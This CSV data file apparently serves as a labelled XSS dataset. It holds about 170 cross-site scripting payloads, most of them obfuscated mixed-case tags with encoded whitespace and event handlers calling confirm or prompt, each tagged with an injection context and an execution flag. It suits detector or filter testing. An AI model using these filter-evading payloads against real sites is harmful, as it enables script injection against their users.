payload,context,exec,combined
<detaILS%0doNtOGglE%0d=%0d[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <detaILS%0doNtOGglE%0d=%0d[8].find(confirm)%0dx>
"<hTMl%09ONPOINtErENteR%0a=%0aa=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <hTMl%09ONPOINtErENteR%0a=%0aa=prompt,a()%0dx//"
<deTaiLS%0donpOINteReNteR%0a=%0a(confirm)()>,html_tag,0,CONTEXT_html_tag <deTaiLS%0donpOINteReNteR%0a=%0a(confirm)()>
<hTML/+/oNPoiNteRENTeR%0a=%0a(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <hTML/+/oNPoiNteRENTeR%0a=%0a(prompt)``%0dx//
<htmL%0aOnMousEOVeR+=+confirm()%0dx>,html_text,0,CONTEXT_html_text <htmL%0aOnMousEOVeR+=+confirm()%0dx>
"<htML%0aONpOIntereNtER%0d=%0da=prompt,a()//",html_text,0,"CONTEXT_html_text <htML%0aONpOIntereNtER%0d=%0da=prompt,a()//"
<htMl/+/onPoiNTEREntEr%09=%09(confirm)()//,html_text,0,CONTEXT_html_text <htMl/+/onPoiNTEREntEr%09=%09(confirm)()//
<deTaIls%0dONTOgGle%0a=%0aconfirm()//,html_tag,0,CONTEXT_html_tag <deTaIls%0dONTOgGle%0a=%0aconfirm()//
<D3v%0aONpOINterEntER%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aONpOINterEntER%09=%09[8].find(confirm)%0dx>v3dm0s
<d3v%09onMouSeoveR+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v%09onMouSeoveR+=+confirm()>v3dm0s
<A%0aonmOuseoVer%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aonmOuseoVer%0d=%0d(confirm)()>v3dm0s
<A%0dOnPoiNtErEnTer%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dOnPoiNtErEnTer%09=%09[8].find(confirm)>v3dm0s
<HtmL%09onpOIntEreNteR%09=%09(confirm)()//,html_tag,0,CONTEXT_html_tag <HtmL%09onpOIntEreNteR%09=%09(confirm)()//
"<hTml%09onMOUseOVer+=+a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <hTml%09onMOUseOVer+=+a=prompt,a()%0dx>"
<a%09ONMOUSeOver%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09ONMOUSeOver%0d=%0dconfirm()%0dx>v3dm0s
<a%09OnpOiNteRentEr%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09OnpOiNteRentEr%0a=%0a(confirm)()>v3dm0s
<hTml%09oNPOInTERENteR%0a=%0a(prompt)``%0dx//,html_text,0,CONTEXT_html_text <hTml%09oNPOInTERENteR%0a=%0a(prompt)``%0dx//
"<HtmL%09OnMouSEOVer%0a=%0aa=prompt,a()//",html_text,0,"CONTEXT_html_text <HtmL%09OnMouSEOVer%0a=%0aa=prompt,a()//"
<detAIlS%0aOnPoiNtEreNTer%0a=%0aconfirm()%0dx>,html_text,0,CONTEXT_html_text <detAIlS%0aOnPoiNtEreNTer%0a=%0aconfirm()%0dx>
""" oninput=alert(1) """,html_text,0,"CONTEXT_html_text "" oninput=alert(1) """
<d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s
"<a%09oNPOIntErENter%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%09oNPOIntErENter%0d=%0da=prompt,a()%0dx>v3dm0s"
<D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s
<DetAilS%0aOnPOiNTerEnteR+=+[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <DetAilS%0aOnPOiNTerEnteR+=+[8].find(confirm)%0dx//
"<a%09oNPOIntErENter%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%09oNPOIntErENter%0d=%0da=prompt,a()%0dx>v3dm0s"
<D3v%09onmOUSeOveR+=+(confirm)()>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%09onmOUSeOveR+=+(confirm)()>v3dm0s
"<HtmL%09oNMOUSeoVer%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <HtmL%09oNMOUSeoVer%0d=%0da=prompt,a()//"
<meter onmouseover=alert(1)>,html_text,0,CONTEXT_html_text <meter onmouseover=alert(1)>
"<htmL%0aONMouSEoVER%0d=%0da=prompt,a()>",html_tag,0,"CONTEXT_html_tag <htmL%0aONMouSEoVER%0d=%0da=prompt,a()>"
"<DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>",html_text,0,"CONTEXT_html_text <DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>"
<d3v%09OnpoiNterEnteR%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09OnpoiNterEnteR%09=%09(confirm)()>v3dm0s
<D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<script>prompt(1)</script>,html_tag,1,CONTEXT_html_tag <script>prompt(1)</script>
<a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s
<A%0aONMouseOVEr+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0aONMouseOVEr+=+confirm()>v3dm0s
"<D3V%09ONMOUsEOver%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%09ONMOUsEOver%09=%09a=prompt,a()%0dx>v3dm0s"
<D3V/+/ONMoUSeOveR%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/ONMoUSeOveR%09=%09confirm()>v3dm0s
<HtmL%0aonPoiNTerenTer+=+confirm()//,html_tag,0,CONTEXT_html_tag <HtmL%0aonPoiNTerenTer+=+confirm()//
<D3v%0doNmoUSeOveR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0doNmoUSeOveR%0a=%0a(prompt)``>v3dm0s
<DeTAILS/+/OntogGle%09=%09confirm()//,html_text,0,CONTEXT_html_text <DeTAILS/+/OntogGle%09=%09confirm()//
<A%09ONpOIntereNtER%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09ONpOIntereNtER%09=%09confirm()%0dx>v3dm0s
<detAIlS%0aONPoiNtErEnTeR+=+(confirm)()>,html_tag,0,CONTEXT_html_tag <detAIlS%0aONPoiNtErEnTeR+=+(confirm)()>
<D3V%0aonPOintERENter%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aonPOintERENter%0d=%0dconfirm()%0dx>v3dm0s
<a%09oNMouseOveR%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09oNMouseOveR%0a=%0a(confirm)()%0dx>v3dm0s
;alert(navigator.userAgent);//,html_text,0,CONTEXT_html_text ;alert(navigator.userAgent);//
<a%09OnPOinTErEnteR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09OnPOinTErEnteR%0a=%0a(prompt)``%0dx>v3dm0s
<a%09onPoinTERenter%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%09onPoinTERenter%0a=%0a(prompt)``>v3dm0s
<D3V%09OnPoInTEReNTEr+=+[8].find(confirm)>v3dm0s,html_tag,0,CONTEXT_html_tag <D3V%09OnPoInTEReNTEr+=+[8].find(confirm)>v3dm0s
<DetAiLS%0aONtoGGLe%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <DetAiLS%0aONtoGGLe%0a=%0aconfirm()%0dx//
<D3V%0dOnPOINTEREntEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0dOnPOINTEREntEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a/+/OnPointeRenTEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnPointeRenTEr%0a=%0aconfirm()%0dx>v3dm0s
<A%0donmOusEOvEr+=+(prompt)``>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0donmOusEOvEr+=+(prompt)``>v3dm0s
<d3v%0aoNMOuSeoVEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aoNMOuSeoVEr%0a=%0aconfirm()%0dx>v3dm0s
<a%0dOnpOINTerEnTeR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dOnpOINTerEnTeR%0a=%0a(prompt)``>v3dm0s
<D3v%0aonPOinterENTER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aonPOinterENTER%0d=%0dconfirm()%0dx>v3dm0s
<a/+/OnMouSeOveR%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnMouSeOveR%0a=%0a(confirm)()%0dx>v3dm0s
<img src=x onerror=alert(window.origin)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(window.origin)>
"<a%0aOnpOINteRENter%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <a%0aOnpOINteRENter%09=%09a=prompt,a()>v3dm0s"
<d3v%09OnpoiNterEnteR%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09OnpoiNterEnteR%09=%09(confirm)()>v3dm0s
"data:text/html,<script>alert(document.domain)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(document.domain)</script>"
<A%09ONmouSEoVEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09ONmouSEoVEr%09=%09confirm()%0dx>v3dm0s
""";alert(document.title);//",script_block,1,"CONTEXT_script_block "";alert(document.title);//"
<D3v%09ONpOiNteREnTER+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <D3v%09ONpOiNteREnTER+=+confirm()%0dx>v3dm0s
"<d3V%0aonPOiNtErENTeR+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CONTEXT_html_tag <d3V%0aonPOiNtErENTeR+=+a=prompt,a()%0dx>v3dm0s"
<a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<Html/+/OnpoINteREnTEr%09=%09confirm()//,html_text,0,CONTEXT_html_text <Html/+/OnpoINteREnTEr%09=%09confirm()//
<a%09onMoUsEOVER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09onMoUsEOVER%0a=%0a(confirm)()>v3dm0s
<d3V/+/oNPOintEReNTER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/oNPOintEReNTER%0d=%0dconfirm()%0dx>v3dm0s
<htML%0dONpoinTeRENTeR+=+confirm()%0dx>,html_text,0,CONTEXT_html_text <htML%0dONpoinTeRENTeR+=+confirm()%0dx>
<a/+/ONpointereNTer+=+(prompt)``>v3dm0s,html_text,0,CONTEXT_html_text <a/+/ONpointereNTer+=+(prompt)``>v3dm0s
<HTmL%09OnpoInTErenteR%0d=%0d[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <HTmL%09OnpoInTErenteR%0d=%0d[8].find(confirm)%0dx//
<HTml%0dOnmOuSEoVeR%09=%09(prompt)``//,html_text,0,CONTEXT_html_text <HTml%0dOnmOuSEoVeR%09=%09(prompt)``//
"<htmL/+/onmOUsEOver+=+a=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <htmL/+/onmOUsEOver+=+a=prompt,a()%0dx//"
<DEtAIlS/+/ONPOinTereNteR%09=%09(prompt)``%0dx//,html_text,0,CONTEXT_html_text <DEtAIlS/+/ONPOinTereNteR%09=%09(prompt)``%0dx//
<HTML/+/ONmOuseOVEr+=+[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <HTML/+/ONmOuseOVEr+=+[8].find(confirm)%0dx>
<d3V%0dONmoUSEOVER%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dONmoUSEOVER%09=%09(prompt)``>v3dm0s
<D3v%0aONpOINterEntER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aONpOINterEntER%09=%09[8].find(confirm)%0dx>v3dm0s
"<d3v/+/ONmOuSeOVeR%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3v/+/ONmOuSeOVeR%0d=%0da=prompt,a()%0dx>v3dm0s"
<D3v%0donMOUSEOveR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0donMOUSEOveR%09=%09(prompt)``%0dx>v3dm0s
<a%0donmOUsEOver+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a%0donmOUsEOver+=+(prompt)``%0dx>v3dm0s
"<deTAiLS/+/oNpoinTERENTer%0d=%0da=prompt,a()//",html_text,0,"CONTEXT_html_text <deTAiLS/+/oNpoinTERENTer%0d=%0da=prompt,a()//"
<d3V%0donpOinteReNTeR+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <d3V%0donpOinteReNTeR+=+confirm()>v3dm0s
<dEtAIlS%0aonTOgGLE%09=%09confirm()//,html_text,0,CONTEXT_html_text <dEtAIlS%0aonTOgGLE%09=%09confirm()//
"<D3v%0donPoinTErEnTEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3v%0donPoinTErEnTEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<A%0aonPOinteREnTeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aonPOinteREnTeR%09=%09[8].find(confirm)%0dx>v3dm0s
<A%0aOnPoIntEreNter%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aOnPoIntEreNter%0d=%0dconfirm()>v3dm0s
<dETailS%0dontoGglE+=+confirm()%0dx//,html_text,0,CONTEXT_html_text <dETailS%0dontoGglE+=+confirm()%0dx//
<meter onmouseover=alert(1)>,html_tag,1,CONTEXT_html_tag <meter onmouseover=alert(1)>
<DetaiLS%09ontOGgLe+=+(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <DetaiLS%09ontOGgLe+=+(confirm)()%0dx//
<HTmL/+/OnmOuSEOVEr%0a=%0a(prompt)``//,html_tag,0,CONTEXT_html_tag <HTmL/+/OnmOuSEOVEr%0a=%0a(prompt)``//
%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_text,0,CONTEXT_html_text %3Cscript%3Ealert(1)%3C%2Fscript%3E
<htmL%0donmOuSEoVer%0a=%0aconfirm()>,html_tag,0,CONTEXT_html_tag <htmL%0donmOuSEoVer%0a=%0aconfirm()>
<D3v%0dONPoinTereNter+=+(confirm)()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%0dONPoinTereNter+=+(confirm)()%0dx>v3dm0s
<D3v%0doNMOUSEovER%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0doNMOUSEovER%0a=%0a(prompt)``%0dx>v3dm0s
<a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s
<hTML%0aoNPoInTerENtEr%09=%09confirm()%0dx//,html_text,0,CONTEXT_html_text <hTML%0aoNPoInTerENtEr%09=%09confirm()%0dx//
javascript:prompt(1),url_href,1,CONTEXT_url_href javascript:prompt(1)
<hTML%0aOnPoINtEREntER+=+confirm()%0dx//,html_text,0,CONTEXT_html_text <hTML%0aOnPoINtEREntER+=+confirm()%0dx//
<hTMl%0aONpOintereNTER%0a=%0a[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <hTMl%0aONpOintereNTER%0a=%0a[8].find(confirm)//
<deTaiLs%09onPOinteRenter%0d=%0d(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <deTaiLs%09onPOinteRenter%0d=%0d(prompt)``%0dx>
<HtMl%0aoNMOUsEOVEr%09=%09(confirm)()%0dx//,html_text,0,CONTEXT_html_text <HtMl%0aoNMOUsEOVEr%09=%09(confirm)()%0dx//
<HtmL%0aoNpOiNTErENTEr%0d=%0d(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <HtmL%0aoNpOiNTErENTEr%0d=%0d(confirm)()%0dx//
<html%0dONmOuSeovER+=+[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <html%0dONmOuSeovER+=+[8].find(confirm)%0dx//
<D3v%0aOnPoinTerentER%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aOnPoinTerentER%09=%09(prompt)``%0dx>v3dm0s
<dETAiLs%09ONtogGLE+=+confirm()>,html_tag,0,CONTEXT_html_tag <dETAiLs%09ONtogGLE+=+confirm()>
<detaILs%09oNtogGlE%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <detaILs%09oNtogGlE%0a=%0aconfirm()//
<detAilS%0doNTOgGle%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <detAilS%0doNTOgGle%09=%09confirm()>
<HtmL%0aOnmouseovER%09=%09(prompt)``//,html_tag,0,CONTEXT_html_tag <HtmL%0aOnmouseovER%09=%09(prompt)``//
<detAILs%0doNpoInTErENtER+=+confirm()%0dx>,html_text,0,CONTEXT_html_text <detAILs%0doNpoInTErENtER+=+confirm()%0dx>
<deTAILs/+/OnpoINTErEntER+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <deTAILs/+/OnpoINTErEntER+=+(confirm)()%0dx>
"<A%09ONmOUsEOvEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%09ONmOUsEOvEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<HTML%0aOnpOInTEreNteR+=+confirm()%0dx>,html_text,0,CONTEXT_html_text <HTML%0aOnpOInTEreNteR+=+confirm()%0dx>
<D3v%09ONpOiNteREnTER+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%09ONpOiNteREnTER+=+confirm()%0dx>v3dm0s
<A/+/ONMouSEOver%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONMouSEOver%0d=%0d(prompt)``>v3dm0s
<d3v%09ONmOUsEover%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09ONmOUsEover%09=%09(confirm)()%0dx>v3dm0s
<a%0donpOINtErEnTeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a%0donpOINtErEnTeR%0a=%0a[8].find(confirm)>v3dm0s
<HtmL/+/oNMOusEOVEr%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <HtmL/+/oNMOusEOVEr%0a=%0aconfirm()%0dx>
<d3V%0dONpoiNteRENTeR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dONpoiNteRENTeR%09=%09(prompt)``%0dx>v3dm0s
<detaILS%0doNPoInteRENTer%0a=%0a[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <detaILS%0doNPoInteRENTer%0a=%0a[8].find(confirm)//
<A/+/onMOUSEover%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/onMOUSEover%0a=%0aconfirm()%0dx>v3dm0s
<d3v%0aOnMouSEoVEr%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aOnMouSEoVEr%0a=%0a(confirm)()>v3dm0s
<A%0doNMOUsEOVEr%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0doNMOUsEOVEr%0d=%0d(prompt)``>v3dm0s
<D3V%09ONpOINterEnteR%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09ONpOINterEnteR%0d=%0d(confirm)()%0dx>v3dm0s
<A%09onMOusEOVeR%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A%09onMOusEOVeR%0d=%0d[8].find(confirm)>v3dm0s
"<deTAILS%09ONToGGlE+=+a=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <deTAILS%09ONToGGlE+=+a=prompt,a()%0dx//"
<DeTAILs/+/ONTOggLe%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <DeTAILs/+/ONTOggLe%09=%09confirm()%0dx//
<Html%0dONpoiNTEReNtER%09=%09confirm()>,html_text,0,CONTEXT_html_text <Html%0dONpoiNTEReNtER%09=%09confirm()>
"<HtMl%09oNPoINteREntEr%0d=%0da=prompt,a()>",html_tag,0,"CONTEXT_html_tag <HtMl%09oNPoINteREntEr%0d=%0da=prompt,a()>"
<htMl%0dONMoUSEOVer%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <htMl%0dONMoUSEOVer%09=%09confirm()>
<D3v/+/onPOinTEreNtER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/onPOinTEreNtER%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s",html_text,0,"CONTEXT_html_text <a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s"
""" oninput=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" oninput=alert(1) """
<a%0aonMOUseOVEr%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aonMOUseOVEr%0a=%0a(prompt)``%0dx>v3dm0s
<A%09onPoInTeRenTeR%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09onPoInTeRenTeR%0a=%0a(confirm)()>v3dm0s
<D3v%0donpOInTErEnteR%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0donpOInTErEnteR%09=%09confirm()%0dx>v3dm0s
<A%0aonMOUSEoVer+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%0aonMOUSEoVer+=+confirm()%0dx>v3dm0s
"<HTml/+/onPoiNtEReNtER%0a=%0aa=prompt,a()//",html_text,0,"CONTEXT_html_text <HTml/+/onPoiNtEReNtER%0a=%0aa=prompt,a()//"
"<dEtAils%09oNpOinTEreNtER%0a=%0aa=prompt,a()//",html_text,0,"CONTEXT_html_text <dEtAils%09oNpOinTEreNtER%0a=%0aa=prompt,a()//"
"<detAiLs/+/onTOGgle+=+a=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <detAiLs/+/onTOGgle+=+a=prompt,a()%0dx//"
<D3V%09OnpOintERenTER%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09OnpOintERenTER%09=%09(prompt)``%0dx>v3dm0s
</script><script>alert(1)</script>,script_block,1,CONTEXT_script_block </script><script>alert(1)</script>
"<htmL%0aoNMoUSeOver%09=%09a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <htmL%0aoNMoUSeOver%09=%09a=prompt,a()>"
<A%0aoNMoUSEOvEr%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNMoUSEOvEr%09=%09(prompt)``%0dx>v3dm0s
"<D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%0dOnmoUsEOvER%09=%09a=prompt,a()>v3dm0s"
<a/+/OnPointeRenTEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnPointeRenTEr%0a=%0aconfirm()%0dx>v3dm0s
<a%0doNmOuSeoveR%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%0doNmOuSeoveR%0d=%0d(prompt)``>v3dm0s
confirm(1),html_text,0,CONTEXT_html_text confirm(1)
<dEtAILs/+/OnToGgLE+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <dEtAILs/+/OnToGgLE+=+confirm()%0dx>
"<DeTails%0aOntOggLE%0d=%0da=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <DeTails%0aOntOggLE%0d=%0da=prompt,a()%0dx>"
<randomtag>,html_text,0,CONTEXT_html_text <randomtag>
"<D3V%09ONMOUsEOver%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3V%09ONMOUsEOver%09=%09a=prompt,a()%0dx>v3dm0s"
<A/+/OnPoINterENTer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnPoINterENTer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<HTMl%09ONMOUSEOVeR%0a=%0a[8].find(confirm)//,html_text,0,CONTEXT_html_text <HTMl%09ONMOUSEOVeR%0a=%0a[8].find(confirm)//
<D3v%0aOnMOuSEOvER%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aOnMOuSEOvER%09=%09(prompt)``%0dx>v3dm0s
<D3V%0dOnpoINtERENTeR%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0dOnpoINtERENTeR%0a=%0a(confirm)()>v3dm0s
"<DETAILS/+/oNPOInTERENtER%09=%09a=prompt,a()//",html_text,0,"CONTEXT_html_text <DETAILS/+/oNPOInTERENtER%09=%09a=prompt,a()//"
<a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s
"<HtMl%09OnMOUSeOVEr%0a=%0aa=prompt,a()>",html_text,0,"CONTEXT_html_text <HtMl%09OnMOUSeOVEr%0a=%0aa=prompt,a()>"
<A%09onMOuSEoVeR+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <A%09onMOuSEoVeR+=+confirm()>v3dm0s
<htmL%0aONMOUsEovER%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <htmL%0aONMOUsEovER%0a=%0aconfirm()%0dx//
<a%09ONMOUsEOVeR%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%09ONMOUsEOVeR%0d=%0d(prompt)``>v3dm0s
<A/+/onMOUSEover%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/onMOUSEover%0a=%0aconfirm()%0dx>v3dm0s
<DeTaIlS%09oNtoGgLe%0a=%0a(prompt)``%0dx>,html_text,0,CONTEXT_html_text <DeTaIlS%09oNtoGgLe%0a=%0a(prompt)``%0dx>
<HtML%0aONpoiNterENtER+=+[8].find(confirm)>,html_text,0,CONTEXT_html_text <HtML%0aONpoiNterENtER+=+[8].find(confirm)>
<hTML%0aOnPoINtEREntER+=+confirm()%0dx//,html_tag,0,CONTEXT_html_tag <hTML%0aOnPoINtEREntER+=+confirm()%0dx//
